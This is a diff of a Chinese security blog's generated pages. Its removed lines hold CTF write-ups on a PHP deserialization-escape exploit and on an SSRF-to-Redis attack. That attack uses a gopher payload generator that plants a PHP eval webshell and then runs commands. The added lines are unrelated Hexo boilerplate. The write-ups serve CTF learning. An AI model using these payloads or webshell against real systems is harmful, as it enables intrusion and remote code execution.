+1234567891011121314151617181920212223&lt;?phpfunction curl($url)&#123;      $ch = curl_init();    curl_setopt($ch, CURLOP ...</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2020/08/16/hello-world/" title="Hello World">     <img class="post_bg" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hello World"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/08/16/hello-world/" title="Hello World">Hello World</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2020-08-16T09:41:45.164Z" title="发表于 2020-08-16 17:41:45">2020-08-16</time></span></div><div class="content">Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.
+Quick StartCreate a new post1$ hexo new &quot;My New Post&quot;
 
-<p>而且发现了一条潜在的利用链：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">注册登录后，访问update.php </span><br><span class="line">---&gt;</span><br><span class="line">使得photo的内容变为config.php</span><br><span class="line">---&gt;</span><br><span class="line">经profile.php中的反序列化,文件读取获得flag</span><br></pre></td></tr></table></figure>
+More info: Writing
+Run server1$ hexo server
 
-<p>当然，这条链上还要解决很多问题。</p>
-<p>不过目前为止，我们的初步审计可以算是告一段落了。</p>
-<h2 id="P3-分析-amp-求解"><a href="#P3-分析-amp-求解" class="headerlink" title="P3 分析&amp;求解"></a>P3 分析&amp;求解</h2><p>先来梳理一下当前的存在的几个困难：</p>
-<h3 id="P3-1-profile-‘photo’-不可控"><a href="#P3-1-profile-‘photo’-不可控" class="headerlink" title="P3.1 $profile[‘photo’]不可控"></a><strong>P3.1 $profile[‘photo’]不可控</strong></h3><p>在<code>update.php</code>中可以发现，photo键值将上传的图片名进行一次MD5，然后拼接。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$profile[&#39;photo&#39;] &#x3D; &#39;upload&#x2F;&#39; . md5($file[&#39;name&#39;]);</span><br></pre></td></tr></table></figure>
+More info: Server
+Generate static files1$ hexo generate
 
-<p>看上去想把这个改成<code>config.php</code>直接GG了，这个就是本题的考点了——<strong>反序列化逃逸</strong>，难度并不大。</p>
-<p>算是很经典的考点。详细可以参考之前的两篇WP：[<a target="_blank" rel="noopener" href="http://www.kee1ongz.pw/2020/04/19/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019easy_serialize_php/">安洵杯 2019]easy_serialize_php</a>和安恒月赛[<a target="_blank" rel="noopener" href="http://www.kee1ongz.pw/2020/05/03/dasctf%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9Bweb1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/">DASCTF安恒月赛]Web1-反序列化字符串逃逸</a>。（题外话：目前图壳由于某些原因正在被安排，图片暂时无法显示，烦人，还不知道能不能恢复。）</p>
-<p>原理就一句话： <strong>PHP 在反序列化时，是以 <code>;</code> 作为字段的分隔，以 <code>&#125;</code> 作为结尾(字符串除外)，且根据长度判断内容。</strong></p>
-<p>虽然photo控制不了，但是name，email和nickname我们都是可控的。<strong>其中nickname作为photo键的前一个键，便是构造逃逸的入手点。</strong></p>
-<h3 id="P3-2-对于nickname的过滤"><a href="#P3-2-对于nickname的过滤" class="headerlink" title="P3.2 对于nickname的过滤"></a><strong>P3.2 对于nickname的过滤</strong></h3><p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200812013242133.png" alt="image-20200812013242133"></p>
-<p>然而页面对我们输入的还是存在一些过滤限制的。注意看photo键值前面的nickname键值，他的逻辑判断很有意思：长度&gt;10或由大小写字母和数字构成就会直接die掉。</p>
-<p>这个过滤方法也是老trick了。<strong>传一个数组参数即可通杀。即nickname[];</strong></p>
-<h3 id="P3-3-由filter函数引发的逃逸"><a href="#P3-3-由filter函数引发的逃逸" class="headerlink" title="P3.3 由filter函数引发的逃逸"></a>P3.3 由filter函数引发的逃逸</h3><p>本题最为精彩的地方就在这里。</p>
-<p>前面提到，在update的时候，会调用class.php中的<strong>过滤函数</strong>：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$new_profile = <span class="built_in">parent</span>::filter($new_profile); <span class="comment">//过滤</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//mysql类</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$string</span>) </span>&#123; <span class="comment">//过滤函数</span></span><br><span class="line">        $escape = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">        $escape = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $escape) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">        $string = preg_replace($escape, <span class="string">&#x27;_&#x27;</span>, $string);</span><br><span class="line"></span><br><span class="line">        $safe = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">        $safe = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $safe) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> preg_replace($safe, <span class="string">&#x27;hacker&#x27;</span>, $string);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+More info: Generating
+Deploy to remote sites1$ hexo deploy
 
-<p>第一个逻辑会把反斜杠替换为_，第二个逻辑会把关键字替换成hacker。<strong>因为$new_profile是经过序列化后才过滤的，这就会引起长度的变化</strong>。</p>
-<p>来模拟一下这个逻辑，这里已经给nickname变为数组。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$profile[<span class="string">&#x27;phone&#x27;</span>] = <span class="string">&#x27;1234567789&#x27;</span>;</span><br><span class="line">$profile[<span class="string">&#x27;email&#x27;</span>] = <span class="string">&#x27;hjnb@126.com&#x27;</span>;</span><br><span class="line">$profile[<span class="string">&#x27;nickname&#x27;</span>][] = <span class="string">&#x27;where&#x27;</span>;</span><br><span class="line">$profile[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="string">&#x27;hello.png&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize($profile);</span><br></pre></td></tr></table></figure>
-
-<p>没有经过<code>filter</code>的时候，结果如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:4:&#123;s:5:&quot;phone&quot;;s:10:&quot;1234567789&quot;;s:5:&quot;email&quot;;s:12:&quot;hjnb@126.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:5:&quot;where&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload&#x2F;69b1510906ccacbb9363690cbb4bd257&quot;;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>现在加上过滤函数，</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$profile[<span class="string">&#x27;phone&#x27;</span>] = <span class="string">&#x27;1234567789&#x27;</span>;</span><br><span class="line">$profile[<span class="string">&#x27;email&#x27;</span>] = <span class="string">&#x27;hjnb@126.com&#x27;</span>;</span><br><span class="line">$profile[<span class="string">&#x27;nickname&#x27;</span>][] = <span class="string">&#x27;where&#x27;</span>;</span><br><span class="line">$profile[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="string">&#x27;hello.png&#x27;</span>);</span><br><span class="line"><span class="comment">//echo serialize($profile);</span></span><br><span class="line"><span class="keyword">echo</span> filter(serialize($profile));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$string</span>) </span>&#123;</span><br><span class="line">        $escape = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">        $escape = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $escape) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">        $string = preg_replace($escape, <span class="string">&#x27;_&#x27;</span>, $string);</span><br><span class="line"></span><br><span class="line">        $safe = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">        $safe = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $safe) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> preg_replace($safe, <span class="string">&#x27;hacker&#x27;</span>, $string);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>结果如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:4:&#123;s:5:&quot;phone&quot;;s:10:&quot;1234567789&quot;;s:5:&quot;email&quot;;s:12:&quot;hjnb@126.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:5:&quot;hacker&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload&#x2F;69b1510906ccacbb9363690cbb4bd257&quot;;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这里就与之前的序列化结果有一些微妙的不同了，可以看到nickname中的where被替换成了hacker。<strong>但是序列化数组中显示的长度仍为5</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s:5:&quot;hacker&quot;</span><br></pre></td></tr></table></figure>
-
-<p>这就给逃逸制造了可能。</p>
-<p>先来看看逃逸成功的序列化字符串：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:4:&#123;s:5:&quot;phone&quot;;s:10:&quot;1234567789&quot;;s:5:&quot;email&quot;;s:12:&quot;hjnb@126.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:5:&quot;hjznb&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload&#x2F;69b1510906ccacbb9363690cbb4bd257&quot;;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>对于该字符串，序列化部分在<code>s:10:&quot;config.php&quot;;&#125;&quot;;&#125;</code>就结束了。后续的都被抛弃。验证如下，可以看到photo键值已经变成了config.php：</p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200812021544175.png" alt="image-20200812021544175"></p>
-<p>如何实现这个序列化字符串呢？换句话说，<strong>如何让”;}s:5:”photo”;s:10:”config.php”;}不是nickname的键值呢？</strong></p>
-<p>这就用到了上面的filter函数。它可以在不改变键值长度的基础上扩大原本键值的长度。</p>
-<p>（where —&gt; hacker，长度+1）</p>
-<p>而<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>的长度为34</p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200812024154336.png" alt="image-20200812024154336"></p>
-<p>那么我们只需要34个where即可逃逸成功，如下图所示。<strong>因为键值的长度（小红圈部分）没有发生改变。而经过filter后，原键值的长度+了34。</strong>那么再经过反序列化的时候，<strong>就会取最先的204个字符（也就是34个hacker）作为键值。而后面34个字符（也就是;}s:5:”photo”;s:10:”config.php”;}）则逃逸成功，不作为nickname键值的一部分。</strong></p>
-<p>这34个字符，<strong>最开始的<code>;&#125;</code>闭合了nickname键，后面的<code>s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>被当作photo键解析并闭合（大红圈部分）。</strong>原有的photo的键则因为闭合而被直接无视。</p>
-<p>这样就成功使得photo键值变为了config.php.</p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200812024347899.png" alt="image-20200812024347899"></p>
-<p>至此，这道题目的难点已经算是拿下了。下面就是实践得解了。</p>
-<h3 id="P3-4-解题步骤"><a href="#P3-4-解题步骤" class="headerlink" title="P3.4 解题步骤"></a>P3.4 解题步骤</h3><p>首先访问register.php，来注册一个账号：</p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200812025752766.png" alt="image-20200812025752766"></p>
-<p>之后登录，定位到了update.php页面：</p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200812025832137.png" alt="image-20200812025832137"></p>
-<p>按规则填写后，抓个包：</p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200812030237639.png" alt="image-20200812030237639"></p>
-<p>将POST的变量名nickname改成数组形式:<code>nickname[]</code>，并将上面的payload作为参数传入：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nickname[]</span><br><span class="line"></span><br><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200812030139395.png" alt="image-20200812030139395"></p>
-<p>修改后直接Forward包，提示我们上传成功：</p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200812030424546.png" alt="image-20200812030424546"></p>
-<p>点击链接来到profile.php。F12看源码，将img标签中的base64解码：</p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200812030555811.png" alt="image-20200812030555811"></p>
-<p>即可成功读取config.php，拿到flag：</p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200812030626707.png" alt="image-20200812030626707"></p>
-<h1 id="III-总结"><a href="#III-总结" class="headerlink" title="III.总结"></a>III.总结</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">审计相关：</span><br><span class="line">代码审计的几种思路？</span><br><span class="line">代码审计所需要的一些工具？</span><br><span class="line">如何定位潜在漏洞点？</span><br><span class="line">如何利用回溯推出利用链？</span><br><span class="line"></span><br><span class="line">题目考点相关：</span><br><span class="line">什么是序列化字符逃逸？</span><br><span class="line">序列化字符逃逸的bypass思路一般是什么？</span><br><span class="line">如何构造逃逸bypass姿势？</span><br></pre></td></tr></table></figure>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://kee1ong.github.io/2020/08/16/dmsj1/" data-id="ckdx07y5j0000k5fy50ie1pi2" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-gkctf2" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/08/16/gkctf2/" class="article-date">
-  <time datetime="2020-08-16T10:53:35.000Z" itemprop="datePublished">2020-08-16</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/08/16/gkctf2/">【GKCTF2020】Web部分Writeup——PartII</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>休息日补一下GKCTF Web部分剩下的题。</p>
-<p>总的来说难度都不大，基本都是在现成的CVE上进行了更改。但自己做题时间有点过慢，估计还是不熟练吧。继续努力。</p>
-<h1 id="GKCTF2020-EZ三剑客–EzWeb"><a href="#GKCTF2020-EZ三剑客–EzWeb" class="headerlink" title="[GKCTF2020]EZ三剑客–EzWeb"></a>[GKCTF2020]EZ三剑客–EzWeb</h1><h2 id="考点：SSRF-bypass-Redis未授权"><a href="#考点：SSRF-bypass-Redis未授权" class="headerlink" title="考点：SSRF bypass+Redis未授权"></a>考点：SSRF bypass+Redis未授权</h2><p>进去后F12看源码，有注释提示：</p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200813135842655.png" alt="image-20200813135842655"></p>
-<p>那我们传个参试一下，应该是输出了ipconfig的结果。可以看到存在内网：173.37.86.X</p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200813135923748.png" alt="image-20200813135923748"></p>
-<p>结合题目输入框的URL，感觉就是SSRF题目了。</p>
-<h3 id="P1-读源码"><a href="#P1-读源码" class="headerlink" title="P1:读源码"></a>P1:读源码</h3><p>这里第一反应就是先尝试用file协议读源码，发现被过滤。</p>
-<p>这里bypass的方法有两种：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">一个斜杠 file:&#x2F;</span><br><span class="line">带空格  file :&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
-
-<p>读取etc/passwd无果，看来是有限制。那么读取一下index.php源码，成功：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200813140636504.png" alt="image-20200813140636504"></p>
-<p>主页源码如下:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params">$url</span>)</span>&#123;  </span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">echo</span> curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">        $url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">        <span class="comment">//echo $url.&quot;\n&quot;;</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is&#x27;</span>, $url,$match))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//var_dump($match);</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;别这样&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        curl($url);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;secret&#x27;</span>]))&#123;</span><br><span class="line">    system(<span class="string">&#x27;ifconfig&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><code>file</code>，<code>dict</code>协议被ban。这里ban掉了dict协议感觉就是防（让）止（你）去探测内网存活主机的指纹。</p>
-<h3 id="P2：探测存活主机-端口"><a href="#P2：探测存活主机-端口" class="headerlink" title="P2：探测存活主机+端口"></a>P2：探测存活主机+端口</h3><p>那么可以尝试利用<code>http</code>协议+BP抓包爆破来探测一下内网存活主机。方法很简单：</p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200813141704477.png" alt="image-20200813141704477"></p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200813141726512.png" alt="image-20200813141726512"></p>
-<p>然后开始爆破，可以看到有好几台存活主机。在主机地址为10的时候发现了一句话：</p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200813142417824.png" alt="image-20200813142417824"></p>
-<p>很明显的提示了，那我们接着利用BP爆破端口：0~65535</p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200813142847600.png" alt="image-20200813142847600"></p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200813142937477.png" alt="image-20200813142937477"></p>
-<p>开了两把LOL跑完了，泪目。可以看到开启了80（http）和6379（Redis）。所以猜测存在Redis未授权。</p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200813144218020.png" alt="image-20200813144218020"></p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200813144236717.png" alt="image-20200813144236717"></p>
-<h3 id="P3：Redis未授权漏洞写shell"><a href="#P3：Redis未授权漏洞写shell" class="headerlink" title="P3：Redis未授权漏洞写shell"></a>P3：Redis未授权漏洞写shell</h3><p>不多说了。老问题：</p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/linuxsec/articles/11221756.html">https://www.cnblogs.com/linuxsec/articles/11221756.html</a></p>
-<p>注意一下应用条件：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.gopher协议可用</span><br><span class="line">2.能访问redis服务器</span><br></pre></td></tr></table></figure>
-
-<p>前面的过滤没有过滤gopher，那可以直接在绝对路径下写个webshell。</p>
-<p>先给出构造的redis命令：生成一个<code>hjnb.php</code>，内容为GET参一句话。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flushall</span><br><span class="line">set 1 &#39;&lt;?php eval($_GET[&quot;hj&quot;]);?&gt;&#39;</span><br><span class="line">config set dir &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">config set dbfilename hjnb.php</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
-
-<p>然后搬一个python2的生成脚本：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;173.37.86.10&quot;</span></span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line">shell=<span class="string">&quot;\n\n&lt;?php eval($_GET[\&quot;hj\&quot;]);?&gt;\n\n&quot;</span></span><br><span class="line">filename=<span class="string">&quot;hjnb.php&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">     <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.format(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">     <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.format(path),</span><br><span class="line">     <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.format(filename),</span><br><span class="line">     <span class="string">&quot;save&quot;</span></span><br><span class="line">     ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.format(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span>(<span class="params">arr</span>):</span></span><br><span class="line">    CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">    cmd+=<span class="string">&quot;*&quot;</span>+str(len(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">&quot;$&quot;</span>+str(len((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += urllib.quote(redis_format(x))</span><br><span class="line">    <span class="keyword">print</span> payload</span><br></pre></td></tr></table></figure>
-
-<p>跑一下：</p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200813145957028.png" alt="image-20200813145957028"></p>
-<p>回到页面，直接扔输入框，提交：</p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200813150049502.png" alt="image-20200813150049502"></p>
-<p>之后在输入框访问该台主机下的我们写入的<code>hjnb.php</code>，已经成功写入：</p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200813151810100.png" alt="image-20200813151810100"></p>
-<p>然后就为所欲为了，注意命令执行要bypass空格，方法很多，$IFS，&lt;&gt;，%20等等。</p>
-<p>这里使用通配符：<code>ls$IFS/</code>看下根目录，发现flag：</p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200813152022138.png" alt="image-20200813152022138"></p>
-<p>cat一下即可，最终payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;173.37.86.10&#x2F;hjnb.php?hj&#x3D;system(&#39;cat$IFS&#x2F;flag&#39;);</span><br></pre></td></tr></table></figure>
-
-<p>成功获得flag：</p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200813152108491.png" alt="image-20200813152108491"></p>
-<p>redis未授权除了可以写shell利用以外，也可以写ssh公钥连ssh/利用contrab反弹shell。是实战中也很重要的一个洞，多加利用。</p>
